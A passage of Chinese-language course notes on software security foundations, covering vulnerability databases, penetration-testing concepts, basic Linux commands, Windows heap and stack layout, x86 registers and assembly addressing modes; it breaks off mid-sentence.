srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><h2 id="漏洞库"><a href="#漏洞库" class="headerlink" title="漏洞库"></a>漏洞库</h2><p>大量软件漏洞需要一个<strong>统一的命名和管理规范</strong>，以便开展针对软件漏洞的研究，<strong>提升漏洞的检测水平</strong>，并为软件使用者和厂商提供有关软件漏洞的确切信息。</p><p>漏洞信息数据库，可以找到<strong>操作系统和应用程序</strong>的特定版本所包含的漏洞信息，甚至针对某些漏洞的专家建议、修复办法和专门的补丁程序。极少的漏洞库还提供检测、测试漏洞的<strong>POC</strong>。POC(proof-of-concepts，为观点提供证据）: 样本验证代码。</p><h4 id="CVE"><a href="#CVE" class="headerlink" title="CVE"></a>CVE</h4><p>MITRE公司建立的<strong>通用漏洞列表CVE</strong>(Common Vulnerabilities and Exposures)相当于软件漏洞的一个<strong>行业标准</strong>，实现了安全漏洞命名机制的规范化和标准化。</p><h4 id="NVD"><a href="#NVD" class="headerlink" title="NVD"></a>NVD</h4><p>美国国家漏洞数据库NVD(National Vulnerabilities Database)</p><p>NVD同时收录三个漏洞数据库的信息，CVE漏洞公告、US-CERT漏洞公告、US- CERT安全警告，也自己发布的漏洞公告和安全警告，是<strong>目前世界上数据量最大， 条目最多的漏洞数据库之一</strong>。</p><h4 id="CNNVD"><a href="#CNNVD" class="headerlink" title="CNNVD"></a>CNNVD</h4><p>中国国家信息安全漏洞库CNNVD(China National Vulnerability Database of Information Security)</p><h4 id="CNVD"><a href="#CNVD" class="headerlink" title="CNVD"></a>CNVD</h4><p>国家信息安全漏洞共享平台CNVD(China National Vulnerability Database)</p><p>CNVD是CNCERT联合国内重要信息系统单位、基础电信运营商、 网络安全厂商建立的信息安全漏洞信息共享知识库，致力于建立国家 统一的信息安全漏洞收集、发布、验证、分析等应急处理体系。</p><h2 id="渗透测试"><a href="#渗透测试" class="headerlink" title="渗透测试"></a>渗透测试</h2><p>渗透测试是通过<strong>模拟恶意黑客的攻击方法</strong>，来评估计算机网络系统安全的一种评估方法。这个过程包括对系统的任何弱点、技术缺陷或漏洞的主动分析，这个分析是从一个攻击者可能存在的位置来进行的，并且从这个位置有条件主动利用安全漏洞。</p><p>换句话来说，渗透测试是指渗透人员**在不同的位置 **(比如从内网、从外网等位置)<strong>利用各种手段</strong>对某个特定网络进行测试，以期发现和挖掘系统中存在的漏洞，然后输出渗透测试报告，并提交给网络所有者。网络所有者根据渗透人员提供的渗透测试报告，可以清晰知晓系统中存在的安全隐患和问题。</p><h3 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h3><p>Kali Linux（Kali）是专门用于渗透测试的Linux操作系统。在Kali和DVWA（Damn Vulnerable Web Application）环境下，演示<strong>渗透测试</strong>及<strong>Web安全</strong>的实验。</p><p>Kali是基于Debian类型的Linux系统版本。其包含在线、离线两种软件包管理工具，dpkg和apt。</p><ul><li>dpkg(Debian Package)管理工具，软件包名以.deb后缀。这种方法适合系统不能联网的情况下。<img src="/2023/03/11/ruan-jian-an-quan-yu-bei-zhi-shi/bb10acd5e3a6392a96e887b581eff686.png" class="lazyload placeholder" data-srcset="/2023/03/11/ruan-jian-an-quan-yu-bei-zhi-shi/bb10acd5e3a6392a96e887b581eff686.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></li><li>APT(Advanced Packaging Tool)高级软件工具。这种方法适合系统能够连接互联网的情况。<img src="/2023/03/11/ruan-jian-an-quan-yu-bei-zhi-shi/59b786fd940c21f619ee5e99bb84d128.png" class="lazyload placeholder" data-srcset="/2023/03/11/ruan-jian-an-quan-yu-bei-zhi-shi/59b786fd940c21f619ee5e99bb84d128.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></li></ul><h3 id="两个显著特点"><a href="#两个显著特点" class="headerlink" title="两个显著特点"></a>两个显著特点</h3><ul><li>渗透测试是一个<strong>渐进的</strong>并且<strong>逐步深入</strong>的过程。 </li><li>渗透测试是选择<strong>不影响业务系统正常运行</strong>的攻击方法进行的测试。</li></ul><h3 id="渗透测试方法"><a href="#渗透测试方法" class="headerlink" title="渗透测试方法"></a>渗透测试方法</h3><h4 id="黑箱测试"><a href="#黑箱测试" class="headerlink" title="黑箱测试"></a>黑箱测试</h4><p>黑箱测试又称为所谓的“Zero-Knowledge Testing”，渗透者完全处于<strong>对系统一无所知的状态</strong>， 通常这类型测试，最初的信息获取来自于DNS、 Web、Email及各种公开对外的服务器。</p><h4 id="白盒测试"><a href="#白盒测试" class="headerlink" title="白盒测试"></a>白盒测试</h4><p>测试者可以通过正常渠道向被测单位取得各种资料，包括网络拓扑、员工资料甚至网站或其它程序的<strong>代码片断</strong>，也能够与单位的其它员工(销售、程序员、管理者…)进行面对面的沟通。</p><h4 id="隐秘测试"><a href="#隐秘测试" class="headerlink" title="隐秘测试"></a>隐秘测试</h4><p>通常情况下，接受渗透测试的单位网络管理部门会收到通知：在某些时段进行测试。因此能够监测网络中出现的变化。隐秘测试则被测单位也仅有极少数人知晓测试的存在，因此能够有效地检验单位中的信息安全事件监控、响应、恢复做得是否到位。</p><h2 id="linux基本命令"><a href="#linux基本命令" class="headerlink" title="linux基本命令"></a>linux基本命令</h2><table><thead><tr><th>基本指令</th><th>功能</th></tr></thead><tbody><tr><td>ls</td><td>显示文件或目录</td></tr><tr><td>mkdir</td><td>创建目录</td></tr><tr><td>cd</td><td>切换目录</td></tr><tr><td>touch</td><td>创建空文件</td></tr><tr><td>cat</td><td>查看文件内容</td></tr><tr><td>cp</td><td>拷贝</td></tr><tr><td>mv</td><td>移动或重命名</td></tr><tr><td>find</td><td>在文件系统中搜索某文件</td></tr><tr><td>stat</td><td>显示指定文件的详细信息，比ls更详细</td></tr><tr><td>who</td><td>显示在线登陆用户</td></tr><tr><td>whoami</td><td>显示当前操作用户</td></tr><tr><td>hostname</td><td>显示主机名</td></tr><tr><td>uname</td><td>显示系统信息</td></tr><tr><td>top</td><td>动态显示当前耗费资源最多进程信息</td></tr><tr><td>ps</td><td>显示瞬间进程状态 ps -aux</td></tr><tr><td>du</td><td>查看目录大小 du -h /home带有 单位显示目录信息</td></tr><tr><td>df</td><td>查看磁盘大小 df -h 带有单位显示磁盘信息</td></tr><tr><td>ifconfig</td><td>查看网络情况</td></tr><tr><td>ping</td><td>测试网络连通</td></tr><tr><td>netstat</td><td>显示网络状态信息</td></tr><tr><td>man</td><td>命令不会用了？用man指令，如：man ls</td></tr><tr><td>clear</td><td>清屏</td></tr><tr><td>kill</td><td>杀死进程，可以先用ps或top命令查看进程的id，然后再用kill命令</td></tr></tbody></table><hr><h1 id="堆栈基础"><a href="#堆栈基础" class="headerlink" title="堆栈基础"></a>堆栈基础</h1><h2 id="问题回顾"><a href="#问题回顾" class="headerlink" title="问题回顾"></a>问题回顾</h2><p><strong>编制程序的四个步骤</strong></p><p>编辑、编译、链接、运行</p><p>编译——检查语法并对单个文件产生可执行程序</p><p>链接——多个可执行文件进行关联(函数调用信息)，增加启动程序等</p><p><strong>如何认识BUG和漏洞</strong></p><p>BUG就是缺陷，一种表现就是用户部分操作导致程序崩溃，比如输入过长、除以0等。</p><p>程序崩溃就意味着用户的输入会影响程序正常执行，意味着可能通过BUG提供的入口输入构造的恶意程序让程序做非法的事情。因此，在安全人眼中，BUG是一种软件漏洞。</p><p><strong>漏洞是网络安全的源起之地。</strong></p><h2 id="内存区域"><a href="#内存区域" class="headerlink" title="内存区域"></a>内存区域</h2><p>一个进程可能被分配到<strong>不同的内存区域</strong>去执行：</p><ul><li>代码区<blockquote><p>通常是指用来存放程序执行代码的一块内存区域，这个区域存储着被装入执行的<strong>二进制机器代码</strong>，处理器会到这个区域<strong>取值并执行</strong>。</p></blockquote></li><li>静态数据区<blockquote><p>通常是指用来存放程序运行时的全局变量、静态变量等的内存区域。通常，静态数据区包括<strong>初始化数据区</strong>(Data Segment)和<strong>未初始化数据区</strong>（BSS Segment）两部分。未初始化数据区存放的是未初始化的全局变量和静态变量，特点是<strong>可读写，在程序执行之前BSS段会自动清0。</strong></p></blockquote></li><li>堆区<blockquote><p>用于<strong>动态地分配进程内存</strong>。进程可以在堆区动态地请求一定大小的内存，并在用完之后归还给堆区。动态分配和回收是堆区的特点。</p></blockquote></li><li>栈区<blockquote><p>用于支持进程的执行，动态地存储函数之间的调用关系、局部变量等，以保证被调用函数在返回时恢复到母函数中继续执行。</p></blockquote></li></ul><p>进程内存的精确组织形式依赖于操作系统、编译器、链接器以及载入器，不同操作系统有不同的内存组织形式。</p><p><img src="/2023/03/11/ruan-jian-an-quan-yu-bei-zhi-shi/81bb40449472799328aa022873cbedd8.png" class="lazyload placeholder" data-srcset="/2023/03/11/ruan-jian-an-quan-yu-bei-zhi-shi/81bb40449472799328aa022873cbedd8.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><h3 id="堆区和栈区"><a href="#堆区和栈区" class="headerlink" title="堆区和栈区"></a>堆区和栈区</h3><p>程序在执行的过程需要两种<u>不同类型的内存</u>来协同配合，即栈区和堆区。</p><h4 id="栈区"><a href="#栈区" class="headerlink" title="栈区"></a>栈区</h4><p><strong>栈(stack)区</strong>主要存储函数运行时的局部变量、数组等。栈变量在使用时不需要额外的申请操作，系统栈会根据函数中的变量声明自动为其预留内存空间； 同样，栈变量的释放也无需程序员参与，由系统栈跟随函数调用的结束<strong>自动回收</strong>。</p><p>栈区是向<strong>低地址扩展</strong>的数据结构，是一种先入后出的特殊结构。栈顶的地址和栈的最大容量是系统预先规定好的，在WINDOWS下，栈的默认大小是2M，如果申请的空间超过栈的剩余空间时，将提示溢出。</p><h4 id="堆区"><a href="#堆区" class="headerlink" title="堆区"></a>堆区</h4><p><strong>堆(heap)区</strong>是一种程序运行时动态分配的内存。所谓动态，就是说所需内存的大小在程序设计时不能预先确定或者内存过大无法在栈区分配，需要在程序运行的时候参考用户的反馈。</p><p>堆区在使用的时候需要程序员使用专有的函数进行申请，如C语言的malloc函数、C++语言的new函数等。 它是向高地址扩展的数据结构，<strong>堆的大小受限于计算机的虚拟内存。</strong></p><h4 id="堆区和栈区的区别"><a href="#堆区和栈区的区别" class="headerlink" title="堆区和栈区的区别"></a>堆区和栈区的区别</h4><ul><li>申请方式<blockquote><p>栈：由系统自动分配。例如，声明一个局部变量int b，系统自动在栈中为b开辟空间。 </p><p>堆：需要程序员自己申请并指明大小。c中malloc函数p1 = (char *)malloc(5)。</p></blockquote></li><li>申请效率<blockquote><p>栈由系统自动分配，速度较快，但程序员是无法控制的。</p><p>堆是由程序员分配的内存，一般速度比较慢，而且<strong>容易产生内存碎片</strong>，不过用起来方便。</p></blockquote></li></ul><h3 id="堆结构"><a href="#堆结构" class="headerlink" title="堆结构"></a>堆结构</h3><p>堆的内存组织如下表，包括<strong>堆块</strong>和<strong>堆表</strong>两部分。</p><p><img src="/2023/03/11/ruan-jian-an-quan-yu-bei-zhi-shi/cec95756179f041920adbf1e6569966d.png" class="lazyload placeholder" data-srcset="/2023/03/11/ruan-jian-an-quan-yu-bei-zhi-shi/cec95756179f041920adbf1e6569966d.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><ul><li>堆表<blockquote><p><u>堆块是堆的基本组织单位，包括两个部分，即块首和块身</u>。块首是用来标识这个堆块自身的信息，例如块大小、空闲还是占用等；块身紧随其后，是最终分配给用户使用的数据区。</p></blockquote></li><li>堆表<blockquote><p><u>堆表一般位于整个堆区的开始位置，用于<strong>索引</strong>堆区中所有堆块的重要信息</u>，包括堆块的位置、堆块的大小、空闲还是占用等。</p><p>堆表的数据结构决定了整个堆区的组织方式，是快速检索空闲块、保证块分配效率的关键。堆表在设计的时候，可能会采用平衡二叉树等高效数据结构用于优化查找效率。现代操作系统的堆表往往不止一种数据结构。</p></blockquote></li></ul><h4 id="堆块"><a href="#堆块" class="headerlink" title="堆块"></a>堆块</h4><p>堆块会有两种状态：<strong>占有态和空闲态</strong>。</p><p>空闲态的堆块会被链入空链表中，由<u>系统</u>管理。 而占有态的堆块会返回一个由程序员定义的句柄，通常是一个<strong>堆块指针</strong>，来完成对堆块内存的读、写和释放操作，由程序员管理。</p><p>对于空闲态堆块而言，<strong>块首额外存储了两个4字节的指针</strong>：Flink指针和Blink指针，用于链接系统中的其他空闲堆块。其中，Flink前向指针存储了前一个空闲块的地址，Blink后向指针存储了后一个空闲块的地址。</p><p><img src="/2023/03/11/ruan-jian-an-quan-yu-bei-zhi-shi/9bb0ad0162f17f668985cbad2656b031.png" class="lazyload placeholder" data-srcset="/2023/03/11/ruan-jian-an-quan-yu-bei-zhi-shi/9bb0ad0162f17f668985cbad2656b031.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><code>注意：指向堆块的指针或者句柄，指向的是块身的首地址。也就是，我们使用函数申请得到的地址指针都会越过8字节(32位系统)的块首，直接指向数据区(块身)。</code></p><blockquote><p>堆块的大小包括块首在内，如果申请32字节，实际会分配40字节，8字节的块首+32 字节的块身。 </p><p>堆块的单位是8字节，不足8字节按8字节分配。</p></blockquote><h4 id="堆表"><a href="#堆表" class="headerlink" title="堆表"></a>堆表</h4><p>在Windows系统中，<u>占有态的堆块被使用它的程序索引，而堆表只索引所有空闲态的堆块</u>。其中，最重要的堆表有两种：空闲双向链表freelist（简称空表）和快速单向链表lookaside（简称快表）。快表是为了<strong>加速堆块分配</strong>而采用的堆表，从来不发生堆块合并。由于堆溢出一般不利用快表，故不作详述。</p><p>空表包含空表索引(Freelist array)和空闲链块两个部分。空表索引也叫空表表头，是一 个<u>大小为128的指针数组</u>，该数组的每一项包括两个指针，用于标识一条空表。</p><p><strong>空表</strong></p><p>空表索引的第二项(free[1])标识了堆中所有大小为8字节的空闲堆块。之后每个索引项指示的空闲堆块递增8字节。把空闲堆块按照大小的不同链入不同的空表，可以方便堆管理系统高效检索指定大小的空闲堆块。空表索引的第一项free[0]所标识的空表相对比较特殊，这条双向链表链入了所有大于等于1024字节小于512KB的堆块，升序排列。这个空表通常又称为零号空表。</p><p><img src="/2023/03/11/ruan-jian-an-quan-yu-bei-zhi-shi/c2153b233d139fe412989a4f2e506d58.png" class="lazyload placeholder" data-srcset="/2023/03/11/ruan-jian-an-quan-yu-bei-zhi-shi/c2153b233d139fe412989a4f2e506d58.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><h4 id="堆块的分配和释放"><a href="#堆块的分配和释放" class="headerlink" title="堆块的分配和释放"></a>堆块的分配和释放</h4><p>以空表为例，来讲解堆块的分配、释放和合并</p><p><strong>堆块分配</strong></p><p>依据既定的查找空闲堆块的策略，找到合适的空闲堆块之后，将其状态修改为占用态、把它从堆表中“卸下”、返回一个指向堆块块身的指针给程序使用。</p><ol><li>普通空表分配时首先寻找最优的空闲块分配，若失败，一个稍大些的块会被用于分配。这种次优分配发生时，会先从大块中按请求的大小精确地“割”出一块进行分配，然后给剩下的部分重新标注块首，链入空表。也就是说，空表分配存在找零钱的情况。</li><li>零号空表中按照大小升序链着大小不同的空闲块，故在分配时先从free[0]反向查找最后一 个块（即最大块），看能否满足要求，如果满足要求，再正向搜索最小能满足要求的空闲堆块进行分配。</li></ol><p><strong>堆块释放</strong></p><p>堆块的释放操作包括将堆块状态由占用态改为空闲态、链入相应的堆表。所有释放的堆块都链入相应的表尾。</p><p><strong>堆块合并</strong></p><p>堆块的分配和释放操作可能引发堆块合并，即当堆管理系统发现两个空闲堆块相邻时，就会进行堆块合并操作。</p><p>堆块的合并包括几个动作：将堆块从空表中卸下、合并堆块、修改合并后的块首、链接入新的链表（合并的时候还有一种操作叫内存紧缩）。</p><h2 id="函数调用"><a href="#函数调用" class="headerlink" title="函数调用"></a>函数调用</h2><p>函数调用时候将借助系统栈来完成<strong>函数状态的保存和恢复。</strong></p><h3 id="函数调用例子"><a href="#函数调用例子" class="headerlink" title="函数调用例子"></a>函数调用例子</h3><p><img src="/2023/03/11/ruan-jian-an-quan-yu-bei-zhi-shi/16b723b65327a1cd15e44686af1b2e7a.png" class="lazyload placeholder" data-srcset="/2023/03/11/ruan-jian-an-quan-yu-bei-zhi-shi/16b723b65327a1cd15e44686af1b2e7a.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>CPU是怎么知道要去func_A的代码区取指，在执行完func_A后又是怎么知道跳回到main函数（而不是func_B的代码区）的呢？这些跳转地址我们在代码中并没有直接说明，CPU是从哪里获得这些函数的调用及返回的信息的呢？</p><p>这些代码区中精确的<strong>跳转</strong>都是在与<strong>系统栈</strong>巧妙地配合过程中完成的。</p><blockquote><p>当函数被调用时，系统栈会为这个函数开辟一个新的栈帧，并把它压入栈中。</p><p><u>每个栈帧对应着一个未运行完的函数</u>。栈帧中保存了该函数的返回地址和局部变量。从逻辑上讲，栈帧就是一个函数执行的环境：函数参数、函数返回地址、函数局部变量等等。</p><p>当函数返回时，系统栈会弹出该函数所对应的栈帧。</p></blockquote><p><img src="/2023/03/11/ruan-jian-an-quan-yu-bei-zhi-shi/64becc14564324010655532db6a758bf.png" class="lazyload placeholder" data-srcset="/2023/03/11/ruan-jian-an-quan-yu-bei-zhi-shi/64becc14564324010655532db6a758bf.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><h3 id="函数调用步骤"><a href="#函数调用步骤" class="headerlink" title="函数调用步骤"></a>函数调用步骤</h3><ul><li>参数入栈<blockquote><p>将参数从右向左压入系统栈中。</p></blockquote></li><li>返回地址入栈<blockquote><p>将当前代码区<strong>调用指令的下一条指令地址</strong>压 入栈中，供函数返回时继续执行。</p></blockquote></li><li>代码区跳转<blockquote><p>处理器从当前代码区跳转到被调用函数的入口处。</p></blockquote></li><li>栈帧调整<blockquote><ol><li>保存当前栈帧状态值，已备后面恢复本栈帧时使用。（EBP入栈）</li><li>将当前栈帧切换到新栈帧。（将ESP值赋值EBP，更新栈帧底部）</li></ol></blockquote></li></ul><h3 id="函数栈帧中包含的信息"><a href="#函数栈帧中包含的信息" class="headerlink" title="函数栈帧中包含的信息"></a>函数栈帧中包含的信息</h3><ul><li>局部变量<blockquote><p>为函数局部变量开辟的内存空间。</p></blockquote></li><li>栈帧状态值<blockquote><p>保存前栈帧的顶部和底部（实际上只保存前栈帧的底部，前栈帧的顶部可以通过 堆栈平衡计算得到），用于在本帧被弹出后恢复出上一个栈帧。</p></blockquote></li><li>函数返回地址<blockquote><p>保存当前函数调用前的** “断点”信息**，也就是函数调用前的指令位置，以便在函数返回时能够恢复到函数被调用前的代码区中继续执行指令。</p></blockquote></li></ul><h2 id="常用寄存器"><a href="#常用寄存器" class="headerlink" title="常用寄存器"></a>常用寄存器</h2><p>寄存器(register)是中央处理器CPU的组成部分。寄存器是有限存贮容量的高速存贮部件。它们可用来暂存指令、数据和地址。我们常常看到32位CPU、64位CPU这样的名称，其实指的就是寄存器的大小。32位CPU的寄存器大小就是4个字节。</p><blockquote><p>CPU本身只负责运算，不负责储存数据。数据一般都储存在内存之中，CPU要用 的时候就去内存读写数据。但是，CPU的运算速度远高于内存的读写速度，为了 避免被拖慢，<strong>CPU自带一级缓存和二级缓存</strong>。基本上，CPU缓存可以看作是读写速度较快的内存。但是，CPU缓存还是不够快，另外<u>数据在缓存里面的地址是不固定的</u>，CPU每次读写都要寻址也会拖慢速度。因此，除了缓存之外，CPU使用寄存器来<strong>储存最常用的数据</strong>。也就是说，那些最频繁读写的数据（比如循环变量），都会放在寄存器里面，CPU优先读写寄存器，再由寄存器跟内存交换数据。</p></blockquote><h3 id="与栈相关的寄存器"><a href="#与栈相关的寄存器" class="headerlink" title="与栈相关的寄存器"></a>与栈相关的寄存器</h3><p>每一个函数独占自己的栈帧空间。当前正在运行的函数的栈帧总是在栈顶。Win32系统提供两个特殊的寄存器用于标识位于系统栈顶端的栈帧：</p><ul><li>ESP<blockquote><p>栈指针寄存器（extended stack pointer），其内存放着一个指针，该指针永远指向系统栈最上面一个栈帧的栈顶。</p></blockquote></li><li>EBP<blockquote><p>基址指针寄存器（extended base pointer），其内存放着一个指针，该指针永远指向系统栈最上面一个栈帧的底部。</p></blockquote></li></ul><p><img src="/2023/03/11/ruan-jian-an-quan-yu-bei-zhi-shi/52d45c9a7c63b2441090dc66890e052a.png" class="lazyload placeholder" data-srcset="/2023/03/11/ruan-jian-an-quan-yu-bei-zhi-shi/52d45c9a7c63b2441090dc66890e052a.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><h3 id="指令寄存器EIP"><a href="#指令寄存器EIP" class="headerlink" title="指令寄存器EIP"></a>指令寄存器EIP</h3><p>指令寄存器（extended instruction pointer），其内存放着一个指针，该指针永远指向下一条等待执行的指令地址。可以说如果控制了EIP寄存器的内容，就控制了进程——我们让EIP指向哪里， CPU就会去执行哪里的指令。</p><h2 id="主要寄存器"><a href="#主要寄存器" class="headerlink" title="主要寄存器"></a>主要寄存器</h2><p><img src="/2023/03/11/ruan-jian-an-quan-yu-bei-zhi-shi/3da3fe25e44f9456b5d92b8c12ca5b0c.png" class="lazyload placeholder" data-srcset="/2023/03/11/ruan-jian-an-quan-yu-bei-zhi-shi/3da3fe25e44f9456b5d92b8c12ca5b0c.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><h3 id="数据寄存器"><a href="#数据寄存器" class="headerlink" title="数据寄存器"></a>数据寄存器</h3><p>数据寄存器主要用来<strong>保存操作数和运算结果等信息</strong>，从而节省读取操作数所需占用总线和访问存储器的时间。</p><p>32位CPU有4个32位的通用寄存器EAX、EBX、ECX和EDX。对低16位数据的存取，不会影响高16位的数据。这些低16位寄存器分别命名为：AX、BX、CX和DX，它和先前CPU中的寄存器相一致。</p><p>4个16位寄存器又可分割成8个独立的8位寄存器(AX：AH-AL、 BX：BH-BL、CX：CH-CL、DX：DH-DL)，每个寄存器都有自己的名称，可独立存取。程序员可利用数据寄存器的这种“可分可合”的特性，灵活地处理字/字节的信息。</p><h4 id="EAX"><a href="#EAX" class="headerlink" title="EAX"></a>EAX</h4><p><code>累加器(Accumulator)</code> </p><p>可用于乘、 除、输入/输出等操作，它们的使用频率很高。EAX还通常用于<strong>存储函数的返回值</strong>。</p><h4 id="EBX"><a href="#EBX" class="headerlink" title="EBX"></a>EBX</h4><p><code>基地址寄存器(Base Register)</code></p><p>它可作为存储器指针来使用，用来访问存储器。</p><h4 id="ECX"><a href="#ECX" class="headerlink" title="ECX"></a>ECX</h4><p><code>计数寄存器(Count Register)</code></p><p>在循环和字符串操作时，要用它来控制循环次数；在位操作中，当移多位时， 要用CL来指明移位的位数。</p><h4 id="EDX"><a href="#EDX" class="headerlink" title="EDX"></a>EDX</h4><p><code>数据寄存器(Data Register)</code></p><p>在进行乘、除运算时，可作为默认操作数参与运算，也可用于存放I/O的端口地址。</p><h3 id="变址寄存器"><a href="#变址寄存器" class="headerlink" title="变址寄存器"></a>变址寄存器</h3><p>变址寄存器主要用来<strong>存放操作数的地址</strong>，用于堆栈操作和变址运算中计算操作数的有效地址。</p><p><img src="/2023/03/11/ruan-jian-an-quan-yu-bei-zhi-shi/b5104542b844c26803b2304134bd25ad.png" class="lazyload placeholder" data-srcset="/2023/03/11/ruan-jian-an-quan-yu-bei-zhi-shi/b5104542b844c26803b2304134bd25ad.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><h3 id="指针寄存器"><a href="#指针寄存器" class="headerlink" title="指针寄存器"></a>指针寄存器</h3><p>寄存器EBP、ESP称为指针寄存器(Pointer Register)，主要用于<strong>存放堆栈内存储单元的偏移量</strong>，用它们可实现多种存储器操作数的寻址方式，为以不同的地址形式访问存储单元提供方便。指针寄存器<strong>不可分割</strong>成8位寄存器。作为通用寄存器，也可存储算术逻辑运算的操作数和运算结果。</p><p><img src="/2023/03/11/ruan-jian-an-quan-yu-bei-zhi-shi/f08a5c2c49ea053bdd83af882fb8dc6f.png" class="lazyload placeholder" data-srcset="/2023/03/11/ruan-jian-an-quan-yu-bei-zhi-shi/f08a5c2c49ea053bdd83af882fb8dc6f.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><h3 id="段寄存器"><a href="#段寄存器" class="headerlink" title="段寄存器"></a>段寄存器</h3><p>段寄存器是根据<strong>内存分段的管理模式</strong>而设置的。内存单元的物理地址由段寄存器的值和一个偏移量组合而成的，标准形式为“<strong>段：偏移量</strong>”，这样可用两个较少位数的值组合成一个可访问较大物理空间的内存地址。</p><p><code>可以认为，一个段是一本书的某一页，偏移量是一页的某一行</code></p><p><img src="/2023/03/11/ruan-jian-an-quan-yu-bei-zhi-shi/af635cb9272cbb09f95904428a9ccb12.png" class="lazyload placeholder" data-srcset="/2023/03/11/ruan-jian-an-quan-yu-bei-zhi-shi/af635cb9272cbb09f95904428a9ccb12.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><h3 id="指令指针寄存器"><a href="#指令指针寄存器" class="headerlink" title="指令指针寄存器"></a>指令指针寄存器</h3><p><strong>指令寄存器</strong>（IR，Instruction Register），是<strong>临时放置从内存里面取得的程序指令</strong>的寄存器，用于<u>存放当前从主存储器读出的正在执行的一条指令</u>。当执行一条指令时，先把它从内存取到数据寄存器（DR，Data Register）中，然后再传送至IR。指令划分为操作码和地址码字段，由二进制数字组成。</p><p><strong>指令指针寄存器</strong>用英文简称为IP（Instruction Pointer），它虽然也是一种指令寄存器，但是严格意义上和传统的指令寄存器有很大的区别。指令指针寄存器存放下次将要执行的指令<strong>在代码段的偏移量</strong>。在计算机工作的时候，CPU会从IP中获得关于指令的相关内存地址，然后按照正确的方式取出指令，并将指令放置到原来的指令寄存器中。</p><p>32位CPU把指令指针扩展到32位，并记作EIP。</p><h3 id="标志寄存器"><a href="#标志寄存器" class="headerlink" title="标志寄存器"></a>标志寄存器</h3><p>标志寄存器在32位操作系统中大小是32位的，也就是说，它可以存32个标志。</p><p>实际上标志寄存器并没有完全被使用，重点认识三个标志寄存器：ZF (零标志)、OF(溢出标志)、CF(进位标志)。</p><p> Z-Flag(零标志)：它可以设成0或者1。</p><p>O-Flag(溢出标志)：反映有符号数加减运算是否溢出。如果运算结果超过了有符号数的表示范围，则OF置1，否则置0。例如：EAX的值为7FFFFFFFF，如果你此时再给EAX加1，OF寄存器就会被设置成1，因为此时EAX寄存器的最高有效位改变了。</p><p>C-Flag(进位标志)：用于反映运算是否产生进位或借位。如果运算结果的最高位产生一个进位或借位，则CF置1，否则置0。例，假如某寄存器值为FFFFFFFF，再加上1就会产生进位。</p><hr><h1 id="汇编语言"><a href="#汇编语言" class="headerlink" title="汇编语言"></a>汇编语言</h1><h2 id="汇编—寻址方式"><a href="#汇编—寻址方式" class="headerlink" title="汇编—寻址方式"></a>汇编—寻址方式</h2><p>寻址方式就是处理器根据指令中给出的地址信息来寻找有效地址的方式，是确定本条指令的数据地址以及下一条要执行的指令地址的方法。</p><h3 id="指令寻址"><a href="#指令寻址" class="headerlink" title="指令寻址"></a>指令寻址</h3><p>指令的寻址方式有以下两种：</p><h4 id="顺序寻址方式"><a href="#顺序寻址方式" class="headerlink" title="顺序寻址方式"></a>顺序寻址方式</h4><p>由于指令地址<strong>在内存中按顺序安排</strong>，当执行一段程序时，通常是一条指令接一条指令地顺序进行。通常，需要使用指令计数器来完成顺序指令寻址。</p><p><strong>指令计数器</strong>是计算机处理器中的一个包含当前正在执行指令地址的寄存器， 在X86架构中称为指令指针IP（Instruction Pointer）寄存器，在ARM或C51架构中也称为程序计数器（PC）。每执行完一条指令时，指令计数器中的地址或自动加1或由转移指针给出下一条指令的地址。</p><h4 id="跳跃寻址方式"><a href="#跳跃寻址方式" class="headerlink" title="跳跃寻址方式"></a>跳跃寻址方式</h4><p>当程序转移执行的顺序时，指令的寻址就采取跳跃寻址方式。<strong>所谓跳跃，是指下条指令的地址码不是由程序计数器给出，而是由本条指令给出。</strong>注意，程序跳跃后按新的指令地址开始顺序执行。因此，程序计数器的内容也必须相应改变，以便及时跟踪新的指令地址。</p><p>采用指令跳跃寻址方式，可以实现程序转移或构成循环程序， 从而能缩短程序长度，或将某些程序作为公共程序引用。指令系统中的各种条件转移或无条件转移指令，就是为了实现指令的跳跃寻址而设置的。<u>注意跳跃的结果是当前指令修改PC程序计数器的值，所以下一条指令仍是通过程序计数器PC给出。</u></p><h3 id="操作数寻址"><a href="#操作数寻址" class="headerlink" title="操作数寻址"></a>操作数寻址</h3><p>形成操作数的有效地址的方法称为操作数的寻址方式。</p><p>汇编指令<code>MOV 目的操作数, 源操作数</code></p><p>表示将一个数据从源地址传送到目标地址。</p><h4 id="立即寻址"><a href="#立即寻址" class="headerlink" title="立即寻址"></a>立即寻址</h4><p>指令的地址字段给出的不是操作数的地址，而是操作数本身， 这种寻址方式称为立即寻址。立即寻址方式的特点是指令执行时间很短，因为它<strong>不需要访问内存取数</strong>，从而节省了访问内存的时间。</p><p><code>MOV CL, 05H</code>表示将05H这个数值存储到CL寄存器中。</p><h4 id="直接寻址"><a href="#直接寻址" class="headerlink" title="直接寻址"></a>直接寻址</h4><p>直接寻址是一种基本的寻址方法，其特点是在指令中直接给出操作数的有效地址。<strong>由于操作数的地址直接给出而不需要经过某种变换，所以称这种寻址方式为直接寻址方式。</strong></p><p><code>MOV AL,[3100H]</code>表示将地址[3100H]中的数据存储到AL中，地址要写在括号“[”，“]”内。</p><p>在通常情况下，<u>操作数存放在数据段中</u>。所以，默认情况下操作数的物理地址由数据段寄存器 DS 